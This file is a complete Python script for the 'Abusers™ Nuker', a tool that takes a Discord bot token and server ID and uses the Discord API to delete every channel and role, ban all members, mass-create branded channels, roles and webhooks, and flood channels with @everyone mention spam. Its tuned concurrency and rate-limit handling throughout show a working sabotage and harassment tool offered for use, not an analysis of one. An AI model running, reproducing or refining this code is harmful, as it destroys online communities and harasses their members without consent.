
import os, asyncio, aiohttp, sys, random, time, json
from datetime import datetime
from colorama import Fore, Style, init
from packaging import version

# Initialize colorama for cross-platform color support
init(autoreset=True)

try:
    from pystyle import Colorate, Write, System, Colors, Center, Anime
    import requests
except ImportError:
    os.system('pip install pystyle requests')
    from pystyle import Colorate, Write, System, Colors, Center, Anime
    import requests

class Abusers:
    def __init__(self):
        self.config = self.load_config()
        self.token = None
        self.guild_id = None
        self.headers = {}
        self.session = None
        self.stats = {
            'channels_deleted': 0,
            'channels_created': 0,
            'roles_deleted': 0,
            'roles_created': 0,
            'members_banned': 0,
            'webhooks_created': 0,
            'messages_sent': 0,
            'mass_mentions_sent': 0,
            'total_operations': 0
        }

    def load_config(self):
        try:
            with open('config.json', 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            # Default config if file doesn't exist
            return {
                "branding": {
                    "name": "Abusers™ Nuker",
                    "version": "4.0.0",
                    "author": "Team Abusers™ & Made By AxYc / SrujaN",
                    "team": "Team Abusers™",
                    "discord": ".gg/abusers"
                },
                "performance": {
                    "max_concurrent_tasks": 150,
                    "rate_limit_delay": 0.001,
                    "webhook_message_delay": 0.0001,
                    "ban_batch_size": 75000,
                    "channel_batch_size": 150,
                    "role_batch_size": 150
                },
                "features": {
                    "multi_channel_names": ["abused-by-abusers", "destroyed-by-team", "nuked-bloody", "terminated-brutally", "obliterated-savagely", "annihilated-mercilessly"],
                    "multi_role_names": ["Abusers™", "Abusers™", "/abusers", "/abusers", "Team Abusers™", "Team Abusers™"],
                    "spam_messages": ["@everyone Abusers™ Were Here - discord.gg/abusers", "@everyone Team Abusers™ - discord.gg/abusers", "@everyone Destroyed By Abusers™"],
                    "mass_mention_count": 100000,
                    "fast_nuke_mode": True,
                    "auto_webhook_spam": True
                }
            }

    def clear_screen(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except:
            pass

    def get_timestamp(self):
        return f"\033[38;2;255;0;0m{datetime.utcnow().strftime(' %H:%M:%S.%f')[:-3]} - \033[0m"

    def log_success(self, message):
        print(f"{self.get_timestamp()}\033[38;2;255;0;0m[SUCCESS] {message}\033[0m")

    def log_error(self, message):
        print(f"{self.get_timestamp()}\033[38;2;255;0;0m[ERROR] {message}\033[0m")

    def log_warning(self, message):
        print(f"{self.get_timestamp()}\033[38;2;255;0;0m[WARNING] {message}\033[0m")

    def log_info(self, message):
        print(f"{self.get_timestamp()}\033[38;2;255;0;0m[INFO] {message}\033[0m")

    def log_nuke(self, message):
        print(f"{self.get_timestamp()}\033[38;2;255;0;0m[NUKE] {message}\033[0m")

    def bloody_gradient(self, text):
        """Pure blood red styling"""
        os.system("")
        faded = ""
        
        for line in text.splitlines():
            faded += f"\033[38;2;255;0;0m{line}\033[0m\n"
        return faded

    def slow_write(self, text, delay=0.0003):
        """Slower typing effect for dramatic impact"""
        for char in text:
            print(char, end="", flush=True)
            time.sleep(delay)

    def display_bloody_logo(self):
        """Display the ABUSERS ASCII art with pure blood red styling"""
        logo = Center.XCenter(f"""
\033[38;2;255;0;0m ▄▄▄       ▄▄▄▄    █    ██   ██████ ▓█████  ██▀███    ██████ \033[0m
\033[38;2;255;0;0m▒████▄    ▓█████▄  ██  ▓██▒▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒▒██    ▒ \033[0m
\033[38;2;255;0;0m▒██  ▀█▄  ▒██▒ ▄██▓██  ▒██░░ ▓██▄   ▒███   ▓██ ░▄█ ▒░ ▓██▄   \033[0m
\033[38;2;255;0;0m░██▄▄▄▄██ ▒██░█▀  ▓▓█  ░██░  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒\033[0m
\033[38;2;255;0;0m ▓█   ▓██▒░▓█  ▀█▓▒▒█████▓ ▒██████▒▒░▒████▒░██▓ ▒██▒▒██████▒▒\033[0m
\033[38;2;255;0;0m ▒▒   ▓▒█░░▒▓███▀▒░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░\033[0m
\033[38;2;255;0;0m  ▒   ▒▒ ░▒░▒   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░\033[0m
\033[38;2;255;0;0m  ░   ▒    ░    ░  ░░░ ░ ░ ░  ░  ░     ░     ░░   ░ ░  ░  ░  \033[0m
\033[38;2;255;0;0m      ░  ░ ░         ░           ░     ░  ░   ░           ░  \033[0m
\033[38;2;255;0;0m                ░                                            \033[0m

\033[38;2;255;0;0m╔═══════════════════════════════════════════════════════════════╗\033[0m
\033[38;2;255;0;0m║                        TEAM ABUSERS™                         ║\033[0m
\033[38;2;255;0;0m║                    Made By AxYc / SrujaN                      ║\033[0m
\033[38;2;255;0;0m║                      Version {self.config['branding']['version']}                            ║\033[0m
\033[38;2;255;0;0m║                        {self.config['branding']['discord']}                            ║\033[0m
\033[38;2;255;0;0m╚═══════════════════════════════════════════════════════════════╝\033[0m
        """)
        
        print(logo)
        self.slow_write(Center.XCenter(f"""
.gg/abusers


"""))

    async def validate_token(self):
        while True:
            self.token = input(f"\033[38;2;255;0;0m[ABUSERS] Enter Bot Token: \033[0m")
            self.headers = {"Authorization": f"Bot {self.token}"}
            
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get("https://discord.com/api/v10/users/@me", headers=self.headers) as r:
                        if r.status == 200:
                            data = await r.json()
                            if 'id' in data:
                                self.log_success(f"Token validated for bot: {data.get('username', 'Unknown')}")
                                return
                        else:
                            self.log_error("Invalid token provided")
            except Exception as e:
                self.log_error(f"Error validating token: {str(e)}")

    def get_guild_id(self):
        while True:
            try:
                self.guild_id = input(f"\033[38;2;255;0;0m[ABUSERS] Enter Guild ID: \033[0m")
                if self.guild_id.isdigit() and len(self.guild_id) >= 17:
                    break
                else:
                    self.log_error("Invalid Guild ID format")
            except KeyboardInterrupt:
                sys.exit(0)

    async def rate_limit_handler(self, response):
        if response.status == 429:
            retry_after = float(response.headers.get('Retry-After', 1))
            self.log_warning(f"Rate limited. Waiting {retry_after}s...")
            await asyncio.sleep(retry_after)
            return True
        return False

    async def fast_create_channels(self, session, count=None):
        if count is None:
            count = len(self.config['features']['multi_channel_names']) * 15
        
        tasks = []
        channel_names = self.config['features']['multi_channel_names']
        created_channels = []
        
        for i in range(count):
            channel_name = random.choice(channel_names)
            if i % 3 == 0:
                channel_name += f"-{random.randint(1000, 9999)}"
            
            task = self.create_channels_with_webhook(session, channel_name, 0, created_channels)
            tasks.append(task)
            
            if len(tasks) >= self.config['performance']['channel_batch_size']:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []
                await asyncio.sleep(self.config['performance']['rate_limit_delay'])
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        # Create webhooks in all newly created channels
        if created_channels:
            self.log_nuke(f"Creating Abusers™ webhooks in {len(created_channels)} channels...")
            await self.create_webhooks_in_channels(session, created_channels)

    async def fast_create_roles(self, session, count=None):
        if count is None:
            count = len(self.config['features']['multi_role_names']) * 8
        
        tasks = []
        role_names = self.config['features']['multi_role_names']
        
        for i in range(count):
            role_name = random.choice(role_names)
            if i % 2 == 0:
                role_name += f"-{random.randint(100, 999)}"
            
            task = self.create_roles(session, role_name)
            tasks.append(task)
            
            if len(tasks) >= self.config['performance']['role_batch_size']:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []
                await asyncio.sleep(self.config['performance']['rate_limit_delay'])
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def ultra_fast_ban_all(self, session):
        members = await self.get_members()
        if not members:
            self.log_warning("No members found to ban")
            return
        
        self.log_nuke(f"Abusers™ : Banning {len(members)} members... ")
        
        tasks = []
        for member_id in members:
            task = self.ban_members(session, member_id)
            tasks.append(task)
            
            if len(tasks) >= self.config['performance']['ban_batch_size']:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []
                await asyncio.sleep(0.005)
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def mass_mention_spam(self, session, count=None):
        if count is None:
            count = self.config['features']['mass_mention_count']
        
        channels = await self.get_channels()
        if not channels:
            self.log_warning("No channels found for mass mention spam")
            return
        
        self.log_nuke(f"Abusers™ - {count} mentions across {len(channels)} channels! ")
        
        spam_messages = self.config['features']['spam_messages']
        mentions_per_channel = count // len(channels)
        
        tasks = []
        for channel_id in channels:
            for i in range(mentions_per_channel):
                message = random.choice(spam_messages)
                task = self.send_message(session, channel_id, message)
                tasks.append(task)
                
                if len(tasks) >= 150:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks = []
                    await asyncio.sleep(self.config['performance']['webhook_message_delay'])
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        self.stats['mass_mentions_sent'] += count

    async def send_message(self, session, channel_id, message):
        try:
            json_data = {'content': message}
            async with session.post(f'https://discord.com/api/v10/channels/{channel_id}/messages', 
                                  headers=self.headers, json=json_data) as r:
                if await self.rate_limit_handler(r):
                    return
                
                if r.status in [200, 201]:
                    self.stats['messages_sent'] += 1
                await asyncio.sleep(self.config['performance']['webhook_message_delay'])
        except Exception as e:
            pass

    async def nuclear_option(self, session):
        """Complete bloody server annihilation"""
        self.log_nuke("Abusers™ - Initiating complete server annihilation...")
        self.log_nuke("Abusers™ - This would take a while...")
        
        # Phase 1: Bloody deletion
        self.log_nuke("Abusers™ - Deletion...")
        delete_tasks = []
        
        channels = await self.get_channels()
        roles = await self.get_roles()
        
        for channel_id in channels:
            delete_tasks.append(self.delete_channels(session, channel_id))
        
        for role_id in roles:
            delete_tasks.append(self.delete_roles(session, role_id))
        
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        # Phase 2: Bloody ban massacre
        self.log_nuke("Abusers™ - Banning..")
        await self.ultra_fast_ban_all(session)
        
        # Phase 3: Bloody reconstruction
        self.log_nuke("Abusers™ - Destruction...")
        create_tasks = [
            self.fast_create_channels(session, 75),
            self.fast_create_roles(session, 50)
        ]
        await asyncio.gather(*create_tasks, return_exceptions=True)
        
        # Phase 4: Bloody spam
        self.log_nuke("Abusers™ - Spamming...")
        await asyncio.sleep(2)
        await self.mass_mention_spam(session, 10000)
        
        self.log_nuke("Abusers™ - Success...")
    async def create_channels(self, session, channel_name, channel_type=0):
        try:
            json_data = {
                'name': channel_name,
                'type': channel_type
            }
            async with session.post(f'https://discord.com/api/v10/guilds/{self.guild_id}/channels', 
                                  headers=self.headers, json=json_data) as r:
                if await self.rate_limit_handler(r):
                    return
                
                if r.status in [200, 201]:
                    data = await r.json()
                    self.log_success(f"Abusers™ : {data.get('name', channel_name)}")
                    self.stats['channels_created'] += 1
                    self.stats['total_operations'] += 1
        except Exception as e:
            pass

    async def create_channels_with_webhook(self, session, channel_name, channel_type=0, created_channels_list=None):
        try:
            json_data = {
                'name': channel_name,
                'type': channel_type
            }
            async with session.post(f'https://discord.com/api/v10/guilds/{self.guild_id}/channels', 
                                  headers=self.headers, json=json_data) as r:
                if await self.rate_limit_handler(r):
                    return
                
                if r.status in [200, 201]:
                    data = await r.json()
                    channel_id = data.get('id')
                    self.log_success(f"Abusers™ : {data.get('name', channel_name)}")
                    self.stats['channels_created'] += 1
                    self.stats['total_operations'] += 1
                    
                    if created_channels_list is not None and channel_id:
                        created_channels_list.append(channel_id)
        except Exception as e:
            pass

    async def create_webhooks_in_channels(self, session, channel_ids):
        """Create Abusers™ webhooks in all channels"""
        webhook_tasks = []
        webhook_name = "Abusers™"
        
        for channel_id in channel_ids:
            task = self.create_single_webhook(session, channel_id, webhook_name)
            webhook_tasks.append(task)
            
            if len(webhook_tasks) >= 25:
                await asyncio.gather(*webhook_tasks, return_exceptions=True)
                webhook_tasks = []
                await asyncio.sleep(0.0005)
        
        if webhook_tasks:
            await asyncio.gather(*webhook_tasks, return_exceptions=True)

    async def create_single_webhook(self, session, channel_id, webhook_name):
        try:
            json_data = {'name': webhook_name}
            async with session.post(f'https://discord.com/api/v10/channels/{channel_id}/webhooks', 
                                  headers=self.headers, json=json_data) as r:
                if await self.rate_limit_handler(r):
                    return
                
                if r.status in [200, 201]:
                    self.log_success(f"Abusers™ -  '{webhook_name}' in channel: {channel_id}")
                    self.stats['webhooks_created'] += 1
                    self.stats['total_operations'] += 1
        except Exception as e:
            pass

    async def create_roles(self, session, role_name):
        try:
            # Bloody red colors for roles
            bloody_colors = [0xFF0000, 0xDC143C, 0x8B0000, 0xB22222, 0xFF1493, 0xFF6347]
            json_data = {
                'name': role_name,
                'permissions': '0',
                'color': random.choice(bloody_colors)
            }
            async with session.post(f'https://discord.com/api/v10/guilds/{self.guild_id}/roles', 
                                  headers=self.headers, json=json_data) as r:
                if await self.rate_limit_handler(r):
                    return
                
                if r.status in [200, 201]:
                    data = await r.json()
                    self.log_success(f"Abusers™ - Created Role: {data.get('name', role_name)}")
                    self.stats['roles_created'] += 1
                    self.stats['total_operations'] += 1
        except Exception as e:
            pass

    async def delete_channels(self, session, channel_id):
        try:
            async with session.delete(f'https://discord.com/api/v10/channels/{channel_id}', 
                                    headers=self.headers) as r:
                if await self.rate_limit_handler(r):
                    return
                
                if r.status in [200, 204]:
                    self.log_success(f"Abusers™ - Brutally deleted channel: {channel_id}")
                    self.stats['channels_deleted'] += 1
                    self.stats['total_operations'] += 1
        except Exception as e:
            pass

    async def delete_roles(self, session, role_id):
        try:
            async with session.delete(f'https://discord.com/api/v10/guilds/{self.guild_id}/roles/{role_id}', 
                                    headers=self.headers) as r:
                if await self.rate_limit_handler(r):
                    return
                
                if r.status in [200, 204]:
                    self.log_success(f"Abusers™ - Brutally deleted role: {role_id}")
                    self.stats['roles_deleted'] += 1
                    self.stats['total_operations'] += 1
        except Exception as e:
            pass

    async def ban_members(self, session, member_id):
        try:
            json_data = {'delete_message_days': 7}
            async with session.put(f"https://discord.com/api/v10/guilds/{self.guild_id}/bans/{member_id}", 
                                 headers=self.headers, json=json_data) as r:
                if await self.rate_limit_handler(r):
                    return
                
                if r.status in [200, 204]:
                    self.log_success(f"Abusers™ - Successfully banned member: {member_id}")
                    self.stats['members_banned'] += 1
                    self.stats['total_operations'] += 1
        except Exception as e:
            pass

    async def webhook_spam(self, session, channel_id, webhook_name, message_count, message):
        try:
            json_data = {'name': webhook_name}
            async with session.post(f'https://discord.com/api/v10/channels/{channel_id}/webhooks', 
                                  headers=self.headers, json=json_data) as r:
                if await self.rate_limit_handler(r):
                    return
                
                if r.status in [200, 201]:
                    webhook_data = await r.json()
                    webhook_url = f"https://discord.com/api/webhooks/{webhook_data['id']}/{webhook_data['token']}"
                    self.log_success(f"Abusers™ - Created webhook in channel: {channel_id}")
                    self.stats['webhooks_created'] += 1
                    
                    for i in range(message_count):
                        try:
                            async with session.post(webhook_url, json={'content': message}) as msg_r:
                                if msg_r.status in [200, 204]:
                                    self.stats['messages_sent'] += 1
                                await asyncio.sleep(self.config['performance']['webhook_message_delay'])
                        except:
                            pass
        except Exception as e:
            pass

    async def get_channels(self):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v10/guilds/{self.guild_id}/channels", 
                                     headers=self.headers) as r:
                    if r.status == 200:
                        data = await r.json()
                        return [channel["id"] for channel in data]
                    else:
                        return []
        except Exception as e:
            return []

    async def get_roles(self):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v10/guilds/{self.guild_id}/roles", 
                                     headers=self.headers) as r:
                    if r.status == 200:
                        data = await r.json()
                        return [role["id"] for role in data if role["name"] != "@everyone" and not role.get("managed", False)]
                    else:
                        return []
        except Exception as e:
            return []

    async def get_members(self):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v10/guilds/{self.guild_id}/members?limit=1000", 
                                     headers=self.headers) as r:
                    if r.status == 200:
                        data = await r.json()
                        return [member["user"]["id"] for member in data if not member["user"].get("bot", False)]
                    else:
                        return []
        except Exception as e:
            return []

    def display_menu(self):
        print(Center.XCenter(f"""
\033[38;2;255;0;0m╔══════════════════════════════════════════════════════════════════════════════════════╗\033[0m
\033[38;2;255;0;0m║                         ABUSERS™ BLOODY MENU                           ║\033[0m
\033[38;2;255;0;0m║                            Team Abusers™ & Made By AxYc / SrujaN                    ║\033[0m
\033[38;2;255;0;0m╚══════════════════════════════════════════════════════════════════════════════════════╝\033[0m
\033[38;2;255;0;0m┌─────────────────────────────────────────────────────────────────────────────────────┐\033[0m
\033[38;2;255;0;0m│ \033[37m[1] Delete All       \033[38;2;255;0;0m│ \033[37m[2] Ban All Members  \033[38;2;255;0;0m│ \033[37m[3] Mass Create      \033[38;2;255;0;0m│ \033[37m[4] Mass Spam    \033[38;2;255;0;0m│\033[0m
\033[38;2;255;0;0m├─────────────────────┼─────────────────────┼─────────────────────┼─────────────────────┤\033[0m
\033[38;2;255;0;0m│ \033[37m[5] Nuclear Destroy  \033[38;2;255;0;0m│ \033[37m[6] Webhook Spam     \033[38;2;255;0;0m│ \033[37m[7] Show Stats       \033[38;2;255;0;0m│ \033[37m[8] Exit Program  \033[38;2;255;0;0m│\033[0m
\033[38;2;255;0;0m└─────────────────────┴─────────────────────┴─────────────────────┴─────────────────────┘\033[0m
        """))

    def display_stats(self):
        self.log_info("=== ABUSERS™ BLOODY STATISTICS ===")
        for key, value in self.stats.items():
            formatted_key = key.replace('_', ' ').title()
            self.log_info(f"   {formatted_key}: {value}")
        self.log_info(f"   Performance: {self.config['performance']['max_concurrent_tasks']} max tasks")
        self.log_info("====================================")

    def reset_stats(self):
        self.stats = {key: 0 for key in self.stats}
        self.log_success("Bloody statistics reset successfully!")

    async def run(self):
        self.clear_screen()
        self.display_bloody_logo()
        
        await self.validate_token()
        self.get_guild_id()
        
        while True:
            self.clear_screen()
            self.display_bloody_logo()
            self.display_menu()
            
            try:
                choice = input(f"\033[38;2;255;0;0m[Abusers™] > \033[0m")
                
                if choice == '1':
                    self.log_nuke("Abusers™ - Bloody Deletion...")
                    channels = await self.get_channels()
                    roles = await self.get_roles()
                    
                    if channels or roles:
                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.config['performance']['max_concurrent_tasks'])) as session:
                            delete_tasks = []
                            for channel_id in channels:
                                delete_tasks.append(self.delete_channels(session, channel_id))
                            for role_id in roles:
                                delete_tasks.append(self.delete_roles(session, role_id))
                            await asyncio.gather(*delete_tasks, return_exceptions=True)
                        self.log_success("Abusers™ - Completed!")
                    else:
                        self.log_warning("Nothing found to brutally destroy.")
                
                elif choice == '2':
                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.config['performance']['max_concurrent_tasks'])) as session:
                        await self.ultra_fast_ban_all(session)
                
                elif choice == '3':
                    self.log_nuke("Abusers™ - Creating...")
                    try:
                        ch_count = int(input(f"\033[38;2;255;0;0m[ABUSERS] Channel Count (default 75): \033[0m") or "75")
                        role_count = int(input(f"\033[38;2;255;0;0m[ABUSERS] Role Count (default 50): \033[0m") or "50")
                        
                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.config['performance']['max_concurrent_tasks'])) as session:
                            create_tasks = [
                                self.fast_create_channels(session, ch_count),
                                self.fast_create_roles(session, role_count)
                            ]
                            await asyncio.gather(*create_tasks, return_exceptions=True)
                        self.log_success("Abusers™ - Completed!")
                    except ValueError:
                        self.log_error("Invalid count entered.")
                
                elif choice == '4':
                    self.log_nuke("Abusers™ - Spamming...")
                    try:
                        mention_count = int(input(f"\033[38;2;255;0;0m[ABUSERS] Mention Count (default {self.config['features']['mass_mention_count']}): \033[0m") or str(self.config['features']['mass_mention_count']))
                        
                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.config['performance']['max_concurrent_tasks'])) as session:
                            await self.mass_mention_spam(session, mention_count)
                        self.log_success("Abusers™ - Completed!")
                    except ValueError:
                        self.log_error("Invalid count entered.")
                
                elif choice == '5':
                    confirm = input(f"\033[38;2;255;0;0m[Abusers™] Type 'AxYc' to confirm: \033[0m")
                    if confirm == 'AxYc':
                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.config['performance']['max_concurrent_tasks'])) as session:
                            await self.nuclear_option(session)
                    else:
                        self.log_warning("Abusers™ - Cancelled!")
                
                elif choice == '6':
                    webhook_name = "Abusers™"
                    message = input(f"\033[38;2;255;0;0m[ABUSERS] Bloody Webhook Message: \033[0m") or "@everyone ABUSERS™ HAS TERMINATED THIS SERVER - discord.gg/abusers"
                    try:
                        msg_count = int(input(f"\033[38;2;255;0;0m[ABUSERS] Messages per webhook (default 150): \033[0m") or "150")
                        channels = await self.get_channels()
                        if channels:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.config['performance']['max_concurrent_tasks'])) as session:
                                await asyncio.gather(*[self.webhook_spam(session, channel_id, webhook_name, msg_count, message) for channel_id in channels], return_exceptions=True)
                            self.log_success("Abusers™ - Completed!")
                        else:
                            self.log_warning("No channels found for bloody webhook spam.")
                    except ValueError:
                        self.log_error("Invalid message count entered.")
                
                elif choice == '7':
                    self.display_stats()
                
                elif choice == '8':
                    self.log_info("Exiting Abusers™ Nuker...")
                    break
                
                else:
                    self.log_warning("Invalid choice. Please select a valid option.")
                
                if choice in ['1', '2', '3', '4', '5', '6']:
                    input(f"\033[38;2;255;0;0m Press Enter to continue the bloodbath... \033[0m")
                
            except KeyboardInterrupt:
                self.log_info("Operation cancelled by user.")
                break
            except Exception as e:
                self.log_error(f"Unexpected bloody error: {str(e)}")

if __name__ == "__main__":
    nuker = Abusers()
    try:
        asyncio.run(nuker.run())
    except KeyboardInterrupt:
        print(f"\n{nuker.get_timestamp()}\033[38;2;255;0;0m Goodbye from Team Abusers™!\033[0m")
    except Exception as e:
        print(f"\n{nuker.get_timestamp()}\033[38;2;255;0;0mFatal error: {str(e)}\033[0m")
